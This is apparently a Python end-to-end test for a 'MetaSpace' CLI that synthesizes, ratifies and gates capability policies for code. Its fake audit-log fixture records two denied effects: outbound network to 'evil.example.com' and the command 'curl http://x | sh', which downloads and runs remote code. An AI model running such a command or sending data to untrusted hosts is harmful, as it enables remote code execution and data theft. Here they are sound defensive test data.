#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
MetaSpace CLI — end-to-end product proof (M0)

Drives the real `metaspace` CLI through the whole product flow, as a user would:
  synthesize a constitution from code -> gate REFUSES it (not ratified) -> ratify it ->
  gate ALLOWS it -> a session report summarizes blocked effects from an audit log.
Every step runs the actual CLI as a subprocess and checks its real behaviour and exit code.
"""

import os
import sys
import json
import tempfile
import subprocess

HERE = os.path.dirname(os.path.abspath(__file__))
REPO_ROOT = os.path.dirname(HERE)
CLI = os.path.join(REPO_ROOT, "cli.py")


def run(*args):
    return subprocess.run([sys.executable, CLI, *args], capture_output=True, text=True)


def main():
    d = tempfile.mkdtemp(prefix="metaspace_cli_")
    app = os.path.join(d, "app.py")
    with open(app, "w", encoding="utf-8") as f:
        f.write('import requests\n\n'
                'def run():\n'
                '    open("out.log", "w").write("x")\n'
                '    requests.get("https://api.acme.com/data")\n')
    bio = os.path.join(d, "app.bio")
    audit = os.path.join(d, "audit.jsonl")
    with open(audit, "w", encoding="utf-8") as f:
        f.write(json.dumps({"decision": "ALLOW", "kind": "FILESYSTEM", "mode": "write", "target": "out.log"}) + "\n")
        f.write(json.dumps({"decision": "DENY", "kind": "NETWORK", "mode": "out", "target": "evil.example.com", "reason": "host not allowed"}) + "\n")
        f.write(json.dumps({"decision": "DENY", "kind": "SUBPROCESS", "mode": "exec", "target": "curl http://x | sh"}) + "\n")

    steps = []
    r = run("synthesize", app, "--out", bio)
    steps.append(("synthesize code -> .bio", r.returncode == 0 and os.path.exists(bio)))
    text = open(bio, encoding="utf-8").read() if os.path.exists(bio) else ""
    steps.append(("synthesized caps include FS + NET", "FILESYSTEM" in text and "NETWORK" in text))

    r = run("gate", bio)
    steps.append(("gate BEFORE ratify -> refused (exit 1)", r.returncode == 1))

    r = run("ratify", bio, "--yes")
    steps.append(("ratify --yes -> exit 0", r.returncode == 0))
    steps.append(("stamped RATIFIED", "PROVENANCE: RATIFIED" in open(bio, encoding="utf-8").read()))

    r = run("gate", bio)
    steps.append(("gate AFTER ratify -> allowed (exit 0)", r.returncode == 0))

    r = run("report", audit)
    steps.append(("report runs and shows BLOCKED effects", r.returncode == 0 and "BLOCKED" in r.stdout))

    print("=" * 70)
    print("  METASPACE CLI — end-to-end product flow (M0)")
    print("=" * 70)
    ok = True
    for name, cond in steps:
        print("   [%s]  %s" % ("OK" if cond else "FAIL", name))
        ok = ok and cond
    print("=" * 70)
    if ok:
        print("  RESULT: PASS - the real CLI drives synthesize -> gate -> ratify -> gate -> report")
        print("          end to end; the product surface works.")
        return 0
    print("  RESULT: FAIL")
    return 1


if __name__ == "__main__":
    sys.exit(main())
